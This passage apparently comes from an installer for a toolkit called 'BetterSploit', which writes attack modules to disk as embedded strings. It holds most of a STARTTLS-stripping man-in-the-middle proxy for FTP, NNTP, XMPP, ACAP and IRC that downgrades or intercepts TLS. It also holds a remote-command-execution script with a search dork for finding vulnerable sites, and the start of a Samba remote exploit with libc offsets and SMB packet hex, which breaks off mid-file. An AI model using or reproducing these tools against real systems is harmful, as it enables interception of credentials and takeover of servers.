                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))

                    data=None
                elif " LOGIN " in data:
                    rewrite.set_result(session, True)
                return data

    class FTP:
        _PROTO_ID = 21
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce AUTH TLS support
                2) raise exception if client tries to negotiated AUTH TLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if session.outbound.sndbuf.strip().lower()=="feat" \
                    and "AUTH TLS" in data:
                    features = (f for f in data.strip().split('\n') if not "AUTH TLS" in f)
                    data = '\n'.join(features)+"\r\n"
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "AUTH TLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif "USER " in data:
                    rewrite.set_result(session, True)
                return data

        class StripWithError:
            ''' 1) force server error on client sending AUTH TLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "AUTH TLS" in data:
                    session.inbound.sendall("500 AUTH TLS not understood\r\n")
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("500 AUTH TLS not understood\r\n")))
                    data=None
                elif "USER " in data:
                    rewrite.set_result(session, True)
                return data

        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "AUTH TLS" in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("234 OK Begin TLS negotation now\r\n")
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("234 OK Begin TLS negotation now\r\n")))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # outbound ssl

                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if not resp_data.startswith("234"):
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))

                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))

                    data=None
                elif "USER " in data:
                    rewrite.set_result(session, True)
                return data

    class NNTP:
        _PROTO_ID = 119
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if session.outbound.sndbuf.strip().lower()=="capabilities" \
                    and "STARTTLS" in data:
                    features = (f for f in data.strip().split('\n') if not "STARTTLS" in f)
                    data = '\n'.join(features)+"\r\n"
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif "GROUP " in data:
                    rewrite.set_result(session, True)
                return data

        class StripWithError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    session.inbound.sendall("502 Command unavailable\r\n")  # or 580 Can not initiate TLS negotiation
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("502 Command unavailable\r\n")))
                    data=None
                elif "GROUP " in data:
                    rewrite.set_result(session, True)
                return data

        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("382 Continue with TLS negotiation\r\n")
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("382 Continue with TLS negotiation\r\n")))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # outbound ssl

                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if not resp_data.startswith("382"):
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))

                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))

                    data=None
                elif "GROUP " in data:
                    rewrite.set_result(session, True)
                return data

    class XMPP:
        _PROTO_ID = 5222
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if "<starttls" in data:
                    start = data.index("<starttls")
                    end = data.index("</starttls>",start)+len("</starttls>")
                    data = data[:start] + data[end:]        # strip starttls from capabilities
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "<starttls" in data:
                    # do not respond with <proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>
                    #<failure/> or <proceed/>
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                    #session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
                    #data=None
                elif any(c in data.lower() for c in ("</auth>","<query","<iq","<username")):
                    rewrite.set_result(session, True)
                return data 

        class StripInboundTLS:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) If starttls is required outbound, leave inbound connection plain - outbound starttls
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if "<starttls" in data:
                    start = data.index("<starttls")
                    end = data.index("</starttls>",start)+len("</starttls>")
                    starttls_args = data[start:end]
                    data = data[:start] + data[end:]        # strip inbound starttls
                    if "required" in starttls_args:
                        # do outbound starttls as required by server
                        session.outbound.sendall("<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")
                        logger.debug("%s [client] => [server][mangled] %s"%(session,repr("<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")))
                        resp_data = session.outbound.recv_blocked()
                        if not resp_data.startswith("<proceed "):
                            raise ProtocolViolationException("whoop!? server announced STARTTLS *required* but fails to proceed.  proto violation: %s"%repr(resp_data))

                        logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                        session.outbound.ssl_wrap_socket()

                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "<starttls" in data:
                    # do not respond with <proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>
                    #<failure/> or <proceed/>
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                    #session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
                    #data=None
                elif any(c in data.lower() for c in ("</auth>","<query","<iq","<username")):
                    rewrite.set_result(session, True)
                return data

        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "<starttls " in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("<proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("<proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE,
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # outbound ssl

                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if not resp_data.startswith("<proceed "):
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))

                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))

                    data=None
                elif "</auth>" in data:
                    rewrite.set_result(session, True)
                return data

    class ACAP:
        #rfc2244, rfc2595
        _PROTO_ID = 675
        _REX_CAP = re.compile(r"\(([^\)]+)\)")
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if all(kw in data for kw in ("ACAP","STARTTLS")):
                    features = Vectors.ACAP._REX_CAP.findall(data)  # features w/o parentheses
                    data = ' '.join("(%s)"%f for f in features if not "STARTTLS" in f)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if " STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif " AUTHENTICATE " in data:       
                    rewrite.set_result(session, True)
                return data

        class StripWithError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if " STARTTLS" in data:
                    id = data.split(' ',1)[0].strip()
                    session.inbound.sendall('%s BAD "command unknown or arguments invalid"'%id)  # or 580 Can not initiate TLS negotiation
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr('%s BAD "command unknown or arguments invalid"'%id)))
                    data=None
                elif " AUTHENTICATE " in data:
                    rewrite.set_result(session, True)
                return data

        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if " STARTTLS" in data:
                    # do inbound STARTTLS
                    id = data.split(' ',1)[0].strip()
                    session.inbound.sendall('%s OK "Begin TLS negotiation now"'%id)
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr('%s OK "Begin TLS negotiation now"'%id)))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # outbound ssl

                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if not " OK " in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))

                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))

                    data=None
                elif " AUTHENTICATE " in data:
                    rewrite.set_result(session, True)
                return data

    class IRC:
        #rfc2244, rfc2595
        _PROTO_ID = 6667
        _REX_CAP = re.compile(r"\(([^\)]+)\)")
        _IDENT_PORT = 113
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if all(kw.lower() in data.lower() for kw in (" cap "," tls")):
                    mangled = []
                    for line in data.split("\n"):
                        if all(kw.lower() in line.lower() for kw in (" cap "," tls")):
                            # can be CAP LS or CAP ACK/NACK
                            if " ack " in data.lower():
                                line = line.replace("ACK","NAK").replace("ack","nak")
                            else:   #ls
                                features = line.split(" ")
                                line = ' '.join(f for f in features if not 'tls' in f.lower())
                        mangled.append(line)
                    data = "\n".join(mangled)
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return 
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                #elif all(kw.lower() in data.lower() for kw in ("cap req","tls")):
                #    # mangle CAPABILITY REQUEST
                #    if ":" in data:
                #        cmd, caps = data.split(":")
                #        caps = (c for c in caps.split(" ") if not "tls" in c.lower())
                #        data="%s:%s"%(cmd,' '.join(caps))
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data

        class StripWithError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    params = {'srv':'this.server.com',
                              'nickname': '*',
                              'cmd': 'STARTTLS'
                              }
                    # if we're lucky we can extract the username from a prev. server line
                    prev_response = session.outbound.recvbuf.strip()
                    if prev_response:  
                        fields = prev_response.split(" ")
                        try:
                            params['srv'] = fields[0]
                            params['nickname'] = fields[2]
                        except IndexError:
                            pass
                    session.inbound.sendall("%(srv)s 691 %(nickname)s :%(cmd)s\r\n"%params)
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("%(srv)s 691 %(nickname)s :%(cmd)s\r\n"%params)))
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data

        class StripWithNotRegistered:
            ''' 1) force server wrong state on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    params = {'srv':'this.server.com',
                              'nickname': '*',
                              'cmd': 'You have not registered'
                              }
                    # if we're lucky we can extract the username from a prev. server line
                    prev_response = session.outbound.recvbuf.strip()
                    if prev_response:  
                        fields = prev_response.split(" ")
                        try:
                            params['srv'] = fields[0]
                            params['nickname'] = fields[2]
                        except IndexError:
                            pass
                    session.inbound.sendall("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)))
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data

        class StripCAPWithNotRegistered:
            ''' 1) force server wrong state on client sending CAP LS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "CAP LS" in data:
                    params = {'srv':'this.server.com',
                              'nickname': '*',
                              'cmd': 'You have not registered'
                              }
                    # if we're lucky we can extract the username from a prev. server line
                    prev_response = session.outbound.recvbuf.strip()
                    if prev_response:  
                        fields = prev_response.split(" ")
                        try:
                            params['srv'] = fields[0]
                            params['nickname'] = fields[2]
                        except IndexError:
                            pass
                    session.inbound.sendall("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)))
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data

        class StripWithSilentDrop:
            ''' 1) silently drop starttls command
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data

        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if " ident " in data.lower():
                    #TODO: proxy ident
                    pass
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    # do inbound STARTTLS
                    params = {'srv':'this.server.com',
                              'nickname': '*',
                              'cmd': 'STARTTLS'
                              }
                    # if we're lucky we can extract the username from a prev. server line
                    prev_response = session.outbound.recvbuf.strip()
                    if prev_response:  
                        fields = prev_response.split(" ")
                        try:
                            params['srv'] = fields[0]
                            params['nickname'] = fields[2]
                        except IndexError:
                            pass
                    session.inbound.sendall(":%(srv)s 670 %(nickname)s :STARTTLS successful, go ahead with TLS handshake\r\n"%params)
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr(":%(srv)s 670 %(nickname)s :STARTTLS successful, go ahead with TLS handshake\r\n"%params)))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # outbound ssl

                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if not " 670 " in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))

                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))

                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data


class RewriteDispatcher(object):
    def __init__(self, generic_tls_intercept=False):
        self.vectors = {}   # proto:[vectors]
        self.results = []   # [ {session,client_ip,mangle,result}, }
        self.session_to_mangle = {}  # session:mangle
        self.generic_tls_intercept = generic_tls_intercept

    def __repr__(self):
        return "<RewriteDispatcher ssl/tls_intercept=%s vectors=%s>"%(self.generic_tls_intercept, repr(self.vectors))

    def get_results(self):
        return self.results

    def get_results_by_clients(self):
        results = {}    #client:{mangle:result}
        for r in self.get_results():
            client = r['client']
            results.setdefault(client,[])
            mangle = r['mangle']
            result = r['result']
            results[client].append((mangle,result))
        return results

    def get_result(self, session):
        for r in self.get_results():
            if r['session']==session:
                return r
        return None

    def set_result(self, session, value):
        r = self.get_result(session)
        r['result'] = value

    def add(self, proto, attack):
        self.vectors.setdefault(proto,set([]))
        self.vectors[proto].add(attack)

    def get_mangle(self, session):
        ''' smart select mangle
            return same mangle for same session
            return different for different session
            try to use all mangles for same client-ip
        '''
        # 1) session already has a mangle associated to it
        mangle = self.session_to_mangle.get(session)
        if mangle:
            return mangle
        # 2) pick new mangle (round-robin) per client
        #    
        client_ip = session.inbound.peer[0]
        client_mangle_history = [r for r in self.get_results() if r['client']==client_ip]

        all_mangles = list(self.get_mangles(session.protocol.protocol_id))
        if not all_mangles:
            return None
        new_index = 0
        if client_mangle_history:
            previous_result = client_mangle_history[-1]
            new_index = (all_mangles.index(previous_result['mangle'])+1) % len(all_mangles)
        mangle = all_mangles[new_index]

        self.results.append({'client':client_ip,
                             'session':session,
                             'mangle':mangle,
                             'result':None}) 

        #mangle = iter(self.get_mangles(session.protocol.protocol_id)).next()
        logger.debug("<RewriteDispatcher  - changed mangle: %s new: %s>"%(mangle,"False" if len(client_mangle_history)>len(all_mangles) else "True"))
        self.session_to_mangle[session] = mangle
        return mangle

    def get_mangles(self, proto):
        m = self.vectors.get(proto,set([]))
        m.update(self.vectors.get(None,[]))
        return m

    def mangle_server_data(self, session, data):
        data_orig = data
        logger.debug("%s [client] <= [server]          %s"%(session,repr(data)))
        if self.get_mangle(session):
            data = self.get_mangle(session).mangle_server_data(session, data, self)
        if data!=data_orig:
            logger.debug("%s [client] <= [server][mangled] %s"%(session,repr(data)))
        return data

    def mangle_client_data(self, session, data):
        data_orig = data
        logger.debug("%s [client] => [server]          %s"%(session,repr(data)))
        if self.get_mangle(session):
            #TODO: just use the first one for now
            data = self.get_mangle(session).mangle_client_data(session, data, self)
        if data!=data_orig:
            logger.debug("%s [client] => [server][mangled] %s"%(session,repr(data)))
        return data

    def on_recv_peek(self, s_in, session):
        if self.generic_tls_intercept:
            # forced by cmdline-option
            return Vectors.GENERIC.Intercept.on_recv_peek(session, s_in)
        elif hasattr(self.get_mangle(session), "on_recv_peek"):
            return self.get_mangle(session).on_recv_peek(session, s_in)

def main():
    from optparse import OptionParser
    ret = 0
    usage = 'usage: BetterSploit/modules/smtplib_starttls_stripping_mitm.py [options]example: BetterSploit/modules/smtplib_starttls_stripping_mitm.py --listen 0.0.0.0:25 --remote mail.server.tld:25'
    parser = OptionParser(usage=usage)
    parser.add_option("-q", "--quiet",
                  action="store_false", dest="verbose", default=True,
                  help="be quiet [default: %default]")
    parser.add_option("-l", "--listen", dest="listen", help="listen ip:port [default: 0.0.0.0:<remote_port>]")
    parser.add_option("-r", "--remote", dest="remote", help="remote target ip:port to forward sessions to")
    parser.add_option("-k", "--key", dest="key", default="server.pem", help="SSL Certificate and Private key file to use, PEM format assumed [default: %default]")
    parser.add_option("-s", "--generic-ssl-intercept",
                  action="store_true", dest="generic_tls_intercept", default=False,
                  help="dynamically intercept SSL/TLS")
    parser.add_option("-b", "--bufsiz", dest="buffer_size", type="int", default=4096)

    all_vectors = []
    for proto in (v for v in dir(Vectors) if not v.startswith("_")):
        for test in (v for v in dir(getattr(Vectors,proto)) if not v.startswith("_")):
            all_vectors.append("%s.%s"%(proto,test))
    parser.add_option("-x", "--vectors",
                  default="ALL",
                  help="Comma separated list of vectors. Use 'ALL' (default) to select all vectors, 'NONE' for tcp/ssl proxy mode. Available vectors: "+", ".join(all_vectors)+""
                  " [default: %default]")
    # parse args
    (options, args) = parser.parse_args()
    # normalize args
    if not options.verbose:
        logger.setLevel(logging.INFO)
    if not options.remote:
        parser.error("mandatory option: remote")
    if ":" not in options.remote and ":" in options.listen:
        # no port in remote, but there is one in listen. use this one
        options.remote = (options.remote.strip(), int(options.listen.strip().split(":")[1]))
        logger.warning("no remote port specified - falling back to %s:%d (listen port)"%options.remote)
    elif ":" in options.remote:
        options.remote = options.remote.strip().split(":")
        options.remote = (options.remote[0], int(options.remote[1]))
    else:
        parser.error("neither remote nor listen is in the format <host>:<port>")
    if not options.listen:
        logger.warning("no listen port specified - falling back to 0.0.0.0:%d (remote port)"%options.remote[1])
        options.listen = ("0.0.0.0",options.remote[1])
    elif ":" in options.listen:
        options.listen = options.listen.strip().split(":")
        options.listen = (options.listen[0], int(options.listen[1]))
    else:
        options.listen = (options.listen.strip(), options.remote[1])
        logger.warning("no listen port specified - falling back to %s:%d (remote port)"%options.listen)
    options.vectors = [o.strip() for o in options.vectors.strip().split(",")]
    if 'ALL' in (v.upper() for v in options.vectors):
        options.vectors = all_vectors
    elif 'NONE' in (v.upper() for v in options.vectors):
        options.vectors = []
    Vectors._TLS_CERTFILE = Vectors._TLS_KEYFILE = options.key

    # ---- start up engines ----
    prx = ProxyServer(listen=options.listen, target=options.remote, 
                      buffer_size=options.buffer_size, delay=0.00001)
    logger.info("%s ready."%prx)
    rewrite = RewriteDispatcher(generic_tls_intercept=options.generic_tls_intercept)

    for classname in options.vectors:
        try:
            proto, vector = classname.split('.',1)
            cls_proto = getattr(globals().get("Vectors"),proto)
            cls_vector = getattr(cls_proto, vector)
            rewrite.add(cls_proto._PROTO_ID, cls_vector)
            logger.debug("* added vector (port:%-5s, proto:%8s): %s"%(cls_proto._PROTO_ID, proto, repr(cls_vector)))
        except Exception, e:
            logger.error("* error - failed to add: %s"%classname)
            parser.error("invalid vector: %s"%classname)

    logging.info(repr(rewrite))
    prx.set_callback("mangle_server_data", rewrite.mangle_server_data)
    prx.set_callback("mangle_client_data", rewrite.mangle_client_data)
    prx.set_callback("on_recv_peek", rewrite.on_recv_peek)
    try:
        prx.main_loop()
    except KeyboardInterrupt:
        logger.warning( "Ctrl C - Stopping server")
        ret+=1

    logger.info(" -- audit results --")
    for client,resultlist in rewrite.get_results_by_clients().iteritems():
        logger.info("[*] client: %s"%client)
        for mangle, result in resultlist:
            logger.info("    [%-11s] %s"%("Vulnerable!" if result else " ",repr(mangle)))

    sys.exit(ret)

if __name__ == '__main__':
    main()
""")
        if FileExistsError:
            pass
        smtp.close()
    except FileExistsError:
        pass


def rce_exploit():
    try:
        rce = open("BetterSploit/modules/basic_rce_exploit.py", "w")
        rce.write("""
#dork:    inurl:faq.php and intext:"Warning:framework()[function.system]"
import requests
import sys


# example : https://vulnerable.com/faq.php
url = str(sys.argv[1])
cmd = str(sys.argv[2])


def _rce_exploit():
  global send_function
  try:
    send_function = requests.get(url+"?"+"cmd="+cmd)
    if send_function.status_code == 200:
      print("						[ !Command Sent! ] \n\n"+str(send_function.text))
    else:
      print("Failed!")
  except IndexError:
    print("Usage : https://vulnerable.com/faq/php whoami")
  finally:
    print(send_function.text)
if __name__ == "__main__":
  _rce_exploit()    
""")
        if FileExistsError:
            pass
        rce.close()
    except FileExistsError:
        pass


def samba():
    try:
        file = open("BetterSploit/modules/Samba_3.5.11/3.6.3.py", "w")
        file.write("""
from binascii import hexlify, unhexlify
import socket
import threading
import SocketServer
import sys
import os
import time
import struct      

targets = [
	{
		"name"               : "samba_3.6.3-debian6",
		"chunk_offset"       : 0x9148,
		"system_libc_offset" : 0xb6d003c0
	},
	{
		"name"               : "samba_3.5.11~dfsg-1ubuntu2.1_i386 (oneiric)",
		"chunk_offset"       : 4560, 
		"system_libc_offset" : 0xb20
	},
	{
		"name"               : "target_finder (hardcode correct system addr)", 
		"chunk_offset"       : 0, 
		"system_libc_offset" : 0xb6d1a3c0, 
		"finder": True
	}
]

do_brute = True
rs = 1024
FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])

def dump(src, length=32):
	result=[]
	for i in xrange(0, len(src), length):
		s = src[i:i+length]
		hexa = ' '.join(["%02x"%ord(x) for x in s])
		printable = s.translate(FILTER)
		result.append("%04x   %-*s   %s\n" % (i, length*3, hexa, printable))
	return ''.join(result)


sploitshake = [
	# HELLO
	"8100004420434b4644454e4543464445" + \
	"46464346474546464343414341434143" + \
	"41434143410020454745424644464545" + \
	"43455046494341434143414341434143" + \
	"4143414341414100",

	# NTLM_NEGOT
	"0000002fff534d427200000000000000" + \
	"00000000000000000000000000001d14" + \
	"00000000000c00024e54204c4d20302e" + \
	"313200",

	# SESSION_SETUP
	"0000004bff534d427300000000080000" + \
	"000000000000000000000000ffff1d14" + \
	"000000000dff000000ffff02001d1499" + \
	"1f00000000000000000000010000000e" + \
	"000000706f736978007079736d6200",

	# TREE_CONNECT
	"00000044ff534d427500000000080000" + \
	"000000000000000000000000ffff1d14" + \
	"6400000004ff00000000000100190000" + \
	"5c5c2a534d425345525645525c495043" + \
	"24003f3f3f3f3f00",

	# NT_CREATE
	"00000059ff534d42a200000000180100" + \
	"00000000000000000000000001001d14" + \
